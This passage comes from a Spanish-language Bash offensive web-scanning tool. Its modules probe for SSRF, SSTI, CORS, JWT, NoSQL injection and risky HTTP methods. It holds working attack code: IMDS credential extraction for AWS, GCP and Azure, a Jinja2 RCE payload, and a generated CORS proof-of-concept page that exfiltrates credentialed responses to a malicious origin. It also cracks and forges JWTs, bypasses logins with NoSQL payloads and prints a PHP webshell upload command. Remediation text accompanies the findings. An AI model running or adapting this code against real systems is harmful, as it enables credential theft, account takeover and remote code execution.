    if echo "$aws_resp" | grep -qiE "ami-id|instance-id|hostname|security-credentials|iam"; then
        intel_log "AWS Metadata accesible via SSRF!"
        local aws_creds
        aws_creds=$(curl -skL --max-time 8 "${ssrf_base}http://169.254.169.254/latest/meta-data/iam/security-credentials/" 2>/dev/null)
        add_finding "CRÍTICO" \
            "SSRF → AWS Metadata Service Accesible (IMDS)" \
            "<b>Metadata:</b><pre>${aws_resp:0:300}</pre><b>Roles IAM:</b><pre>${aws_creds:0:200}</pre>" \
            "10.0" \
            "1) Requerir IMDSv2 (token obligatorio): aws ec2 modify-instance-metadata-options --http-tokens required. 2) Corregir la vulnerabilidad SSRF base." \
            "Extraer credenciales temporales: ${ssrf_base}http://169.254.169.254/latest/meta-data/iam/security-credentials/ROLE_NAME"
        INTEL_CLOUD_PROVIDER="aws"
    fi

    # GCP metadata
    local gcp_resp
    gcp_resp=$(curl -skL --max-time 8 -H "Metadata-Flavor: Google" "${ssrf_base}http://metadata.google.internal/computeMetadata/v1/instance/" 2>/dev/null)
    if echo "$gcp_resp" | grep -qiE "zone|id|name|service-accounts"; then
        add_finding "CRÍTICO" \
            "SSRF → GCP Metadata Service Accesible" \
            "<pre>${gcp_resp:0:400}</pre>" \
            "10.0" \
            "Usar Metadata Concealment. Corregir SSRF base. Deshabilitar metadatos de legacy." \
            "Token OAuth: ${ssrf_base}http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token"
        INTEL_CLOUD_PROVIDER="gcp"
    fi

    # Azure metadata
    local az_resp
    az_resp=$(curl -skL --max-time 8 -H "Metadata: true" "${ssrf_base}http://169.254.169.254/metadata/instance?api-version=2021-02-01" 2>/dev/null)
    if echo "$az_resp" | grep -qiE "subscriptionId|resourceGroupName|location|vmId"; then
        add_finding "CRÍTICO" \
            "SSRF → Azure Instance Metadata Service Accesible" \
            "<pre>${az_resp:0:400}</pre>" \
            "10.0" \
            "Usar Azure IMDS con Required Headers en nivel de NIC. Corregir SSRF base." \
            "Token: ${ssrf_base}http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
        INTEL_CLOUD_PROVIDER="azure"
    fi

    # Internal services via SSRF
    local internal_probes=(
        "http://127.0.0.1:6379/"         # Redis
        "http://127.0.0.1:9200/"         # Elasticsearch
        "http://127.0.0.1:2375/v1.41/info"  # Docker API
        "http://127.0.0.1:8080/"         # Internal app
        "http://127.0.0.1:3306/"         # MySQL
        "http://127.0.0.1:27017/"        # MongoDB
    )
    for svc in "${internal_probes[@]}"; do
        local svc_resp
        svc_resp=$(curl -skL --max-time 5 "${ssrf_base}${svc}" 2>/dev/null)
        if echo "$svc_resp" | grep -qiE "redis|elastic|docker|mysql|mongo|OK|version|PONG"; then
            local svc_name="${svc##*:}"
            add_finding "CRÍTICO" \
                "SSRF → Servicio Interno Expuesto: ${svc}" \
                "<pre>${svc_resp:0:300}</pre>" \
                "10.0" \
                "Segmentar red interna. Corregir SSRF. Usar firewall para bloquear acceso a servicios internos desde la app web." \
                "Explotar: ${ssrf_base}${svc}"
        fi
    done
}

# ─── MÓDULO 33: SSTI ─────────────────────────────────────────────
modulo_ssti() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo si hay backend de template engine detectado
    local has_template=false
    [[ " ${INTEL_FRAMEWORK_BACKEND[*]}$INTEL_FRAMEWORK_BACKEND " =~ "flask|django|fastapi|symfony|laravel|rails|jinja|twig|smarty|erb" ]] && has_template=true
    [[ ${#INTEL_INJECTABLE_URLS[@]} -gt 0 ]] && has_template=true
    [[ "$has_template" == "false" ]] && { warn "SSTI: sin template engine detectado. Saltando (activa con módulo custom)."; return; }

    log "MÓDULO 33: SSTI — Server-Side Template Injection"
    tip "SSTI en Jinja2/Twig/Smarty/ERB = RCE. Una de las vulns más críticas."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/ssti_results.txt"

    # Payloads por engine — expresiones matemáticas que deben evaluarse
    declare -A SSTI_PAYLOADS
    SSTI_PAYLOADS["Jinja2/Flask"]='{{7*7}} {{config}} {{self.__dict__}}'
    SSTI_PAYLOADS["Twig/Symfony"]='{{7*7}} {{7*"7"}} #{7*7}'
    SSTI_PAYLOADS["Smarty/PHP"]='{{7*7}} {php}echo 7*7;{/php} {$smarty.version}'
    SSTI_PAYLOADS["ERB/Rails"]='<%= 7*7 %> <%= system("id") %>'
    SSTI_PAYLOADS["Freemarker"]='${7*7} ${"freemarker.template.utility.Execute"?new()("id")}'
    SSTI_PAYLOADS["Pebble"]='{{7*7}} {%for i in range(3)%}{{i}}{%endfor%}'

    local DETECT_PROBES=('{{7*7}}' '${7*7}' '<%= 7*7 %>' '#{7*7}' '{7*7}' '@(7*7)' '${{7*7}}')
    local EXPECTED="49"

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    [[ ${#test_urls[@]} -eq 0 ]] && test_urls+=("${base_url}/?q=test" "${base_url}/?search=test" "${base_url}/?name=test" "${base_url}/?msg=test")

    local found=0
    for test_url in "${test_urls[@]:0:15}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')
        [[ -z "$param" ]] && continue

        for probe in "${DETECT_PROBES[@]}"; do
            local encoded_probe
            encoded_probe=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${probe}'))" 2>/dev/null || echo "$probe")
            local probe_url="${test_url%=*}=${encoded_probe}"
            local resp
            resp=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)

            if echo "$resp" | grep -q "$EXPECTED"; then
                warn "SSTI DETECTADO: ${probe} evaluado a ${EXPECTED} en ${probe_url}"
                echo "SSTI: ${probe_url}" >> "$out_file"
                ((found++))
                INTEL_SSTI_FOUND=true

                # Detectar el engine
                local engine="Desconocido"
                [[ "$probe" =~ "{{" ]] && [[ " ${INTEL_FRAMEWORK_BACKEND} " =~ "flask|django|fastapi" ]] && engine="Jinja2 (Python)"
                [[ "$probe" =~ "{{" ]] && [[ " ${INTEL_FRAMEWORK_BACKEND} " =~ "symfony|twig" ]] && engine="Twig (PHP)"
                [[ "$probe" =~ "<%" ]] && engine="ERB (Ruby/Rails)"
                [[ "$probe" =~ '${' ]] && engine="Freemarker/Pebble/Thymeleaf"

                add_finding "CRÍTICO" \
                    "SSTI Confirmado — Template Injection (${engine})" \
                    "<b>URL:</b> ${probe_url}<br><b>Payload:</b> ${probe}<br><b>Evaluó a:</b> ${EXPECTED}<br><b>Engine probable:</b> ${engine}" \
                    "10.0" \
                    "1) NUNCA renderizar input de usuario como template. 2) Usar render_template_string con escape. 3) Sandboxear el entorno Jinja2: SandboxedEnvironment(). 4) Validar y sanitizar toda entrada antes de usarla en templates." \
                    "RCE en Jinja2: {{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].decode()}} | O usar tplmap: tplmap -u '${probe_url}'"
                break 2
            fi
        done
    done

    if [[ $found -eq 0 ]]; then
        ok "SSTI: sin indicios detectados."
        add_finding "INFO" "SSTI" "Sin template injection detectada en parámetros probados." \
            "N/A" \
            "Revisar manualmente campos de texto libre: mensajes de error personalizados, plantillas de email, comentarios." \
            "Usar tplmap: pip3 install tplmap && tplmap -u 'URL?param=*'"
    fi
    echo
}

# ─── MÓDULO 34: CORS MISCONFIGURATION ────────────────────────────
modulo_cors() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 34: CORS Misconfiguration"
    tip "CORS mal configurado permite que sitios maliciosos lean respuestas API con tus cookies."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/cors_results.txt"

    local TEST_ORIGINS=(
        "https://evil.com"
        "https://evil.${TARGET}"
        "https://${TARGET}.evil.com"
        "null"
        "http://${TARGET}"
        "https://localhost"
        "https://attacker.com"
    )

    local vuln_found=false
    local cors_html=""

    for origin in "${TEST_ORIGINS[@]}"; do
        local resp_headers
        resp_headers=$(curl -skI --max-time 10 \
            -H "Origin: ${origin}" \
            -H "Access-Control-Request-Method: GET" \
            "$base_url" 2>/dev/null)

        local acao
        acao=$(echo "$resp_headers" | grep -i "access-control-allow-origin" | tr -d '\r')
        local acac
        acac=$(echo "$resp_headers" | grep -i "access-control-allow-credentials" | tr -d '\r')

        if [[ -n "$acao" ]]; then
            echo "Origin: ${origin} → ${acao} ${acac}" | tee -a "$out_file"
            cors_html+="<tr><td>${origin}</td><td>${acao}</td><td>${acac}</td></tr>"

            # CRÍTICO: origin reflection + credentials
            if echo "$acao" | grep -qi "$origin" && echo "$acac" | grep -qi "true"; then
                vuln_found=true
                INTEL_CORS_VULN=true
                INTEL_CORS_ORIGIN="$origin"
                add_finding "CRÍTICO" \
                    "CORS: Origin Reflection + Credentials — Robo de Sesión Posible" \
                    "<b>Origin enviado:</b> ${origin}<br><b>Respuesta:</b> ${acao} ${acac}" \
                    "9.3" \
                    "1) No usar Access-Control-Allow-Origin: * con credenciales. 2) Validar Origin con lista blanca estricta. 3) No reflejar automáticamente el Origin recibido." \
                    "PoC generado automáticamente — ver archivo cors_poc.html"
                _generate_cors_poc "$base_url" "$origin"

            # ALTO: wildcard
            elif echo "$acao" | grep -q "\*"; then
                add_finding "ALTO" \
                    "CORS: Wildcard (*) Permite Cualquier Origen" \
                    "<b>Access-Control-Allow-Origin: *</b><br>Cualquier dominio puede leer respuestas de la API." \
                    "7.4" \
                    "Reemplazar * por lista blanca de dominios: Access-Control-Allow-Origin: https://tudominio.com" \
                    "Si hay autenticación con cookies, cambiar a origen específico. Wildcard + credentials no es posible en browser."

            # MEDIO: null origin
            elif echo "$acao" | grep -qi "null" || echo "$origin" | grep -qi "null" && echo "$acao" | grep -qi "null"; then
                add_finding "ALTO" \
                    "CORS: Origen 'null' Permitido" \
                    "El servidor acepta origin: null (usado en iframes sandboxed, archivos locales, redirects)." \
                    "7.0" \
                    "Nunca permitir origin: null en producción. Agregar a lista negra." \
                    "PoC: crear iframe sandbox que realice petición cross-origin con origin: null"
            fi
        fi
    done

    if [[ "$vuln_found" == "false" ]]; then
        ok "CORS: configuración aparentemente correcta."
        add_finding "INFO" "CORS" "No se detectaron misconfiguraciones graves de CORS." \
            "N/A" \
            "Verificar manualmente en endpoints de API con credenciales." \
            "curl -sI -H 'Origin: https://evil.com' ${base_url}/api/ | grep -i cors"
    fi
    echo
}

_generate_cors_poc() {
    local target_url="$1" evil_origin="$2"
    local poc_file="${OUTPUT_DIR}/web/cors_poc.html"
    cat > "$poc_file" << POCEOF
<!DOCTYPE html>
<!-- WriestTavo v4.0 — CORS PoC automático -->
<!-- Hostear en ${evil_origin} para ejecutar el ataque -->
<html>
<head><title>CORS PoC — ${target_url}</title></head>
<body>
<h2>CORS Attack PoC</h2>
<p>Este PoC demuestra que <b>${evil_origin}</b> puede leer respuestas de <b>${target_url}</b></p>
<pre id="output">Ejecutando...</pre>
<script>
fetch('${target_url}', {
    method: 'GET',
    credentials: 'include',
    headers: { 'Content-Type': 'application/json' }
})
.then(r => r.text())
.then(data => {
    document.getElementById('output').textContent =
        'ÉXITO — Datos robados de ${target_url}:\n\n' + data.substring(0, 2000);
    console.log('CORS VULN CONFIRMED:', data);
})
.catch(e => document.getElementById('output').textContent = 'Error: ' + e);
</script>
</body>
</html>
POCEOF
    ok "PoC CORS generado: ${poc_file}"
    add_finding "CRÍTICO" \
        "CORS PoC de Ataque Generado" \
        "<b>Archivo:</b> ${poc_file}<br>Hostear en servidor malicioso para demostrar robo de datos cross-origin con credenciales." \
        "9.3" \
        "Ver hallazgo CORS anterior para remediación." \
        "Hostear PoC: python3 -m http.server 8000 en directorio de outputs | Abrir ${poc_file} en navegador víctima"
}



# ─── MÓDULO 35: JWT ANALYSIS + CRACK ─────────────────────────────
modulo_jwt() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 35: JWT Analysis — alg:none, Weak Secret, Confusion"
    tip "JWT mal implementado = bypass de autenticación total. Muy frecuente en APIs."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/jwt_results.txt"

    # Recolectar JWTs de múltiples fuentes
    local all_jwts=("${INTEL_JWT_TOKENS[@]}")

    # Buscar en respuestas HTTP
    local resp_headers
    resp_headers=$(curl -skI --max-time 10 "$base_url" 2>/dev/null)
    local jwt_in_headers
    jwt_in_headers=$(echo "$resp_headers" | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -5)
    [[ -n "$jwt_in_headers" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_headers"

    # Buscar en cuerpo de página
    local page_body
    page_body=$(curl -skL --max-time 10 "$base_url" 2>/dev/null)
    local jwt_in_body
    jwt_in_body=$(echo "$page_body" | grep -oE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' | head -5)
    [[ -n "$jwt_in_body" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_body"

    # Buscar en archivos JS ya analizados
    if [[ -d "${OUTPUT_DIR}/web/js_analysis" ]]; then
        local jwt_in_js
        jwt_in_js=$(grep -rohE 'eyJ[A-Za-z0-9_-]+\.eyJ[A-Za-z0-9_-]+\.[A-Za-z0-9_-]*' "${OUTPUT_DIR}/web/js_analysis/" 2>/dev/null | head -10)
        [[ -n "$jwt_in_js" ]] && while IFS= read -r t; do all_jwts+=("$t"); done <<< "$jwt_in_js"
    fi

    # Deduplicar
    local unique_jwts=()
    for tok in "${all_jwts[@]}"; do
        local already=false
        for u in "${unique_jwts[@]}"; do [[ "$u" == "$tok" ]] && already=true && break; done
        [[ "$already" == "false" ]] && unique_jwts+=("$tok")
    done

    if [[ ${#unique_jwts[@]} -eq 0 ]]; then
        ok "JWT: no se encontraron tokens en respuestas iniciales."
        intel_log "JWT: registrar manualmente con INTEL_JWT_TOKENS+=('eyJ...')"
        add_finding "INFO" "JWT Analysis" "No se encontraron JWTs en respuestas HTTP iniciales. Probar rutas de API autenticadas." \
            "N/A" "Analizar tokens obtenidos con: jwt_tool TOKEN -t alg_confusion | john --wordlist=rockyou.txt" \
            "Capturar tokens en Burp Suite durante flujo de login y analizar manualmente"
        return
    fi

    ok "JWTs encontrados: ${#unique_jwts[@]}"
    local jwt_html=""

    for jwt in "${unique_jwts[@]}"; do
        # Decodificar header y payload
        local header_b64 payload_b64
        header_b64=$(echo "$jwt" | cut -d. -f1)
        payload_b64=$(echo "$jwt" | cut -d. -f2)

        # Padding base64
        local header_json payload_json
        header_json=$(echo "${header_b64}==" | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "decode_error")
        payload_json=$(echo "${payload_b64}==" | base64 -d 2>/dev/null | python3 -m json.tool 2>/dev/null || echo "decode_error")

        local alg
        alg=$(echo "$header_json" | grep -oE '"alg"\s*:\s*"[^"]+"' | grep -oE '"[A-Za-z0-9]+"$' | tr -d '"')
        local sub
        sub=$(echo "$payload_json" | grep -oE '"sub"\s*:\s*"[^"]+"' | grep -oE '"[^"]+\"$' | tr -d '"')

        echo "JWT: alg=${alg} sub=${sub}" >> "$out_file"
        echo "Header: ${header_json}" >> "$out_file"
        echo "Payload: ${payload_json}" >> "$out_file"

        add_finding "INFO" \
            "JWT Encontrado y Decodificado" \
            "<b>Algoritmo:</b> ${alg}<br><b>Subject:</b> ${sub}<br><b>Header:</b><pre>${header_json}</pre><b>Payload:</b><pre>${payload_json}</pre>" \
            "N/A" "" ""

        jwt_html+="<tr><td>${alg}</td><td>${sub}</td><td>${jwt:0:50}...</td></tr>"

        # ── TEST 1: alg:none ──
        local none_header
        none_header=$(echo '{"alg":"none","typ":"JWT"}' | base64 -w 0 | tr '+/' '-_' | tr -d '=')
        local none_jwt="${none_header}.${payload_b64}."
        local none_resp
        none_resp=$(curl -sk --max-time 8 \
            -H "Authorization: Bearer ${none_jwt}" \
            "${base_url}/api/me" 2>/dev/null)
        local none_status
        none_status=$(curl -sko /dev/null --max-time 8 \
            -H "Authorization: Bearer ${none_jwt}" \
            -w "%{http_code}" "${base_url}/api/me" 2>/dev/null)

        if [[ "$none_status" == "200" ]] && echo "$none_resp" | grep -qiE "user|email|id|name|role"; then
            INTEL_JWT_ALG_NONE=true
            add_finding "CRÍTICO" \
                "JWT: alg:none Aceptado — Bypass de Autenticación" \
                "<b>Token modificado (alg:none) aceptado por el servidor.</b><br>Respuesta: <pre>${none_resp:0:400}</pre>" \
                "10.0" \
                "Validar explícitamente el algoritmo en el servidor. Usar librerías seguras como python-jose con algorithm=['HS256'] explícito. Rechazar tokens con alg:none." \
                "PoC: curl -H 'Authorization: Bearer ${none_jwt}' ${base_url}/api/me"
        fi

        # ── TEST 2: RS256 → HS256 confusion ──
        if [[ "$alg" == "RS256" ]]; then
            intel_log "JWT RS256 detectado → vulnerable a confusion RS256→HS256"
            add_finding "ALTO" \
                "JWT: Algoritmo RS256 — Posible Confusion Attack" \
                "Token usa RS256. Si el servidor acepta HS256, la clave pública puede usarse como HMAC secret." \
                "8.1" \
                "Forzar el algoritmo en validación: jwt.decode(token, key, algorithms=['RS256']). Nunca aceptar múltiples algoritmos." \
                "Obtener clave pública: curl ${base_url}/.well-known/jwks.json | Usar jwt_tool para confusion: jwt_tool TOKEN -X k -pk public.pem"
        fi

        # ── TEST 3: Weak secret crack con hashcat/john ──
        if [[ "$alg" == "HS256" || "$alg" == "HS384" || "$alg" == "HS512" ]]; then
            local wordlist="/usr/share/wordlists/rockyou.txt"
            [[ ! -f "$wordlist" ]] && wordlist="/usr/share/seclists/Passwords/Common-Credentials/10k-most-common.txt"

            if [[ -f "$wordlist" ]] && command -v hashcat >/dev/null 2>&1; then
                intel_log "JWT ${alg} → intentando crack con hashcat (wordlist: $(basename $wordlist))"
                local hash_file="/tmp/jwt_hash.txt"
                echo "$jwt" > "$hash_file"

                local crack_result
                crack_result=$(hashcat -a 0 -m 16500 "$hash_file" "$wordlist" \
                    --quiet --potfile-disable 2>/dev/null | head -3)

                if [[ -n "$crack_result" ]] && echo "$crack_result" | grep -q ":"; then
                    local cracked_secret
                    cracked_secret=$(echo "$crack_result" | grep -oE ':[^:]+$' | tr -d ':')
                    INTEL_JWT_WEAK_SECRET="$cracked_secret"
                    add_finding "CRÍTICO" \
                        "JWT: Secret Débil Crackeado — '${cracked_secret}'" \
                        "<b>Secret encontrado:</b> ${cracked_secret}<br>Con este secret se puede forjar cualquier token." \
                        "10.0" \
                        "Usar un secret aleatorio de al menos 256 bits. Rotar el secret inmediatamente. Invalidar todos los tokens activos." \
                        "Forjar token de admin: python3 -c \"import jwt; print(jwt.encode({'sub':'admin','role':'admin'}, '${cracked_secret}', algorithm='HS256'))\""
                fi
            elif command -v john >/dev/null 2>&1 && [[ -f "$wordlist" ]]; then
                echo "$jwt" > "/tmp/jwt_john.txt"
                john --wordlist="$wordlist" --format=HMAC-SHA256 "/tmp/jwt_john.txt" 2>/dev/null
                local cracked
                cracked=$(john --show --format=HMAC-SHA256 "/tmp/jwt_john.txt" 2>/dev/null | grep -v "^0\|^$" | head -1)
                if [[ -n "$cracked" ]]; then
                    add_finding "CRÍTICO" "JWT: Secret Crackeado por John" "<pre>${cracked}</pre>" \
                        "10.0" "Rotar secret JWT inmediatamente. Usar mínimo 256 bits aleatorios." \
                        "Forjar tokens con el secret obtenido"
                fi
            fi
        fi
    done

    [[ -n "$jwt_html" ]] && add_finding "MEDIO" \
        "Resumen JWT: ${#unique_jwts[@]} Tokens Analizados" \
        "<table class='vuln-table'><tr><th>alg</th><th>sub</th><th>Token</th></tr>${jwt_html}</table>" \
        "5.0" "Auditar cada token. Verificar expiración, roles y claims sensibles." \
        "Análisis completo: jwt_tool TOKEN -t ALL | https://jwt.io para decodificar visualmente"
    echo
}

# ─── MÓDULO 36: NOSQLI ───────────────────────────────────────────
modulo_nosqli() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return
    # Solo si MongoDB u otro NoSQL detectado, o si hay APIs
    local relevant=false
    [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " mongodb " ]] && relevant=true
    [[ ${#INTEL_API_ENDPOINTS[@]} -gt 0 ]] && relevant=true
    [[ "$relevant" == "false" ]] && {
        warn "NoSQLi: MongoDB/NoSQL no detectado. Ejecutar solo si hay endpoints API JSON."
        return
    }

    log "MÓDULO 36: NoSQL Injection — MongoDB y APIs JSON"
    tip "NoSQLi es frecuente en apps Node.js+MongoDB. Bypass de login sin conocer contraseña."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/nosqli_results.txt"

    # Payloads NoSQLi — GET y POST JSON
    local GET_PAYLOADS=(
        "[\$ne]=1"
        "[\$gt]="
        "[\$where]=sleep(2000)"
        "[\$regex]=.*"
    )

    local test_urls=("${INTEL_INJECTABLE_URLS[@]}")
    [[ ${#test_urls[@]} -eq 0 ]] && test_urls+=("${base_url}/login" "${base_url}/api/login" "${base_url}/api/auth" "${base_url}/api/user")

    local found=0
    for test_url in "${test_urls[@]:0:10}"; do
        local param
        param=$(echo "$test_url" | grep -oE '[?&][a-zA-Z_]+=' | head -1 | tr -d '?&=')

        # GET payloads
        for payload in "${GET_PAYLOADS[@]}"; do
            local probe_url="${test_url%=*}${payload}"
            local resp status
            resp=$(curl -skL --max-time 10 "$probe_url" 2>/dev/null)
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "$probe_url" 2>/dev/null)

            if [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "token|welcome|dashboard|success|user|logged"; then
                INTEL_NOSQLI_FOUND=true
                ((found++))
                add_finding "CRÍTICO" \
                    "NoSQL Injection Detectado (GET) — ${param}" \
                    "<b>URL:</b> ${probe_url}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "1) Usar ODM seguro (Mongoose con schema validation). 2) Sanitizar input: escapar operadores \$ y .. 3) Usar librerías como mongo-sanitize. 4) Validar tipos de datos estrictamente." \
                    "Explotar login bypass: username[\$ne]=a&password[\$ne]=a → acceso sin credenciales"
                break
            fi
        done

        # POST JSON payloads
        local JSON_PAYLOADS=(
            '{"username":{"$ne":""},"password":{"$ne":""}}'
            '{"username":"admin","password":{"$gt":""}}'
            '{"username":{"$regex":".*"},"password":{"$regex":".*"}}'
            '{"username":"admin","password":{"$ne":null}}'
        )

        for json_pay in "${JSON_PAYLOADS[@]}"; do
            local resp status
            resp=$(curl -skL --max-time 10 -X POST \
                -H "Content-Type: application/json" \
                -d "$json_pay" \
                "$test_url" 2>/dev/null)
            status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 -X POST \
                -H "Content-Type: application/json" \
                -d "$json_pay" \
                "$test_url" 2>/dev/null)

            if [[ "$status" == "200" ]] && echo "$resp" | grep -qiE "token|jwt|welcome|dashboard|success|logged|user"; then
                INTEL_NOSQLI_FOUND=true
                ((found++))
                add_finding "CRÍTICO" \
                    "NoSQL Injection en POST JSON — Login Bypass" \
                    "<b>Endpoint:</b> ${test_url}<br><b>Payload:</b> ${json_pay}<br><b>Respuesta:</b><pre>${resp:0:400}</pre>" \
                    "9.8" \
                    "Sanitizar input JSON. Usar mongo-sanitize. Validar esquema con Joi o Zod. Rechazar objetos donde se esperan strings." \
                    "Extraer usuarios: probar {username:{\$regex:'^a'},password:{\$ne:''}} para enumerar"
                break
            fi
        done

        [[ "$INTEL_NOSQLI_FOUND" == "true" ]] && break
    done

    [[ $found -eq 0 ]] && add_finding "INFO" "NoSQL Injection" "Sin indicios de NoSQLi básico detectados." \
        "N/A" "Revisar manualmente endpoints de login/API JSON con Burp Repeater." \
        "Usar nosqlmap: python nosqlmap.py --url URL"
    echo
}

# ─── MÓDULO 37: HTTP METHODS + IIS + WINDOWS ─────────────────────
modulo_http_methods() {
    [[ ${#WEB_PORTS[@]} -eq 0 ]] && return

    log "MÓDULO 37: HTTP Methods + IIS/Windows Específico"
    tip "PUT/DELETE habilitados = escritura de archivos. TRACE = robo de cookies HttpOnly."

    local proto="http" port="${WEB_PORTS[0]}"
    [[ "$port" == "443" || "$port" == "8443" ]] && proto="https"
    local base_url="${ORIGINAL_URL:-${proto}://${TARGET}}"
    local out_file="${OUTPUT_DIR}/web/http_methods.txt"

    # OPTIONS para ver métodos permitidos
    local opts_resp
    opts_resp=$(curl -skI --max-time 10 -X OPTIONS "$base_url" 2>/dev/null)
    local allowed_methods
    allowed_methods=$(echo "$opts_resp" | grep -i "Allow:" | tr -d '\r')
    echo "OPTIONS: ${allowed_methods}" | tee -a "$out_file"

    # Test métodos peligrosos
    local DANGEROUS_METHODS=("PUT" "DELETE" "TRACE" "CONNECT" "PATCH" "DEBUG")
    local dangerous_found=""

    for method in "${DANGEROUS_METHODS[@]}"; do
        local status
        status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 -X "$method" "$base_url" 2>/dev/null)
        echo "${method}: ${status}" >> "$out_file"

        if [[ "$status" != "405" && "$status" != "501" && "$status" != "000" && "$status" != "404" ]]; then
            dangerous_found+="${method}(${status}) "

            case "$method" in
                PUT)
                    # Intentar subir archivo de prueba
                    local put_resp
                    put_resp=$(curl -sk --max-time 8 -X PUT \
                        -d "wriestavo-test" \
                        "${base_url}/wriestavo_test.txt" \
                        -w "\n%{http_code}" 2>/dev/null)
                    local put_status="${put_resp##*$'\n'}"
                    if [[ "$put_status" == "201" || "$put_status" == "204" || "$put_status" == "200" ]]; then
                        add_finding "CRÍTICO" \
                            "HTTP PUT Habilitado — Subida de Archivos Posible" \
                            "Método PUT activo. Posible subida de webshell." \
                            "9.8" \
                            "Deshabilitar método PUT en configuración del servidor web. Apache: LimitExcept GET POST { deny from all }. Nginx: if (\$request_method !~ ^(GET|POST|HEAD)\$) { return 405; }" \
                            "Subir webshell: curl -X PUT -d '<?php system(\$_GET[c]); ?>' ${base_url}/shell.php"
                        # Limpiar prueba
                        curl -sk -X DELETE "${base_url}/wriestavo_test.txt" >/dev/null 2>&1
                    fi
                    ;;
                TRACE)
                    local trace_resp
                    trace_resp=$(curl -sk --max-time 8 -X TRACE \
                        -H "Cookie: test=wriestavo_trace_test" "$base_url" 2>/dev/null)
                    if echo "$trace_resp" | grep -q "wriestavo_trace_test"; then
                        add_finding "MEDIO" \
                            "HTTP TRACE Habilitado — XST (Cross-Site Tracing)" \
                            "TRACE refleja headers incluyendo cookies. Permite robo de cookies HttpOnly via XSS." \
                            "6.1" \
                            "Deshabilitar TRACE. Apache: TraceEnable off. Nginx: ya está deshabilitado por defecto." \
                            "PoC XST: XSS + TRACE para obtener cookie HttpOnly"
                    fi
                    ;;
                DEBUG)
                    # IIS DEBUG method
                    add_finding "ALTO" \
                        "HTTP DEBUG Habilitado (IIS)" \
                        "Método DEBUG de IIS activo. Permite debugging remoto de ASP.NET." \
                        "7.5" \
                        "Deshabilitar en IIS: Denegar método DEBUG en reglas de request filtering." \
                        "Explotar: curl -X DEBUG -H 'Command: stop-debug' -H 'Accept: application/x-msdeploy' ${base_url}"
                    ;;
            esac
        fi
    done

    [[ -n "$dangerous_found" ]] && add_finding "ALTO" \
        "Métodos HTTP Peligrosos Habilitados: ${dangerous_found}" \
        "<pre>${allowed_methods}</pre>" "7.5" \
        "Deshabilitar todos los métodos HTTP no necesarios. Solo permitir GET, POST y HEAD en la mayoría de casos." \
        "Ver hallazgos individuales por método"

    # IIS específico
    if [[ "$INTEL_OS" == "windows" ]] || [[ " ${INTEL_TECHNOLOGIES[*]} " =~ " iis " ]]; then
        # IIS ShortName (8.3 filename) vulnerability
        local sn_status
        sn_status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "${base_url}/*~1*/a.aspx" 2>/dev/null)
        if [[ "$sn_status" == "404" ]]; then
            # 404 en IIS con tilde = vulnerable (diferente de 400)
            local sn2_status
            sn2_status=$(curl -sko /dev/null -w "%{http_code}" --max-time 8 "${base_url}/a*~1*/a.aspx" 2>/dev/null)
            if [[ "$sn2_status" != "$sn_status" ]]; then
                add_finding "MEDIO" \
                    "IIS ShortName (8.3) Filename Enumeration Posible" \
                    "IIS puede revelar nombres cortos 8.3 de archivos/directorios vía respuestas HTTP diferenciales." \
                    "5.3" \
                    "Deshabilitar nombres 8.3: fsutil 8dot3name set C: 1. Actualizar IIS. Instalar hotfix MS10-070." \
                    "Usar IIS ShortName Scanner: java -jar iis_shortname_scanner.jar 2 20 ${base_url}"
            fi
        fi

        # NTLM authentication exposure
        local ntlm_check
        ntlm_check=$(curl -skI --max-time 8 -H "Authorization: NTLM TlRMTVNTUAABAAAAB4IIAAAAAAAAAAAAAAAAAAAAAAA=" \
            "$base_url" 2>/dev/null)
        if echo "$ntlm_check" | grep -qi "NTLM\|Negotiate\|WWW-Authenticate"; then
            local domain_info
            domain_info=$(echo "$ntlm_check" | grep -i "WWW-Authenticate" | head -2)
            add_finding "MEDIO" \
                "NTLM Authentication Expuesto" \
                "<pre>${domain_info}</pre>NTLM puede revelar nombre de dominio interno." \
                "5.3" \
                "Usar autenticación moderna (OAuth2/SAML). Deshabilitar NTLM donde no sea necesario." \
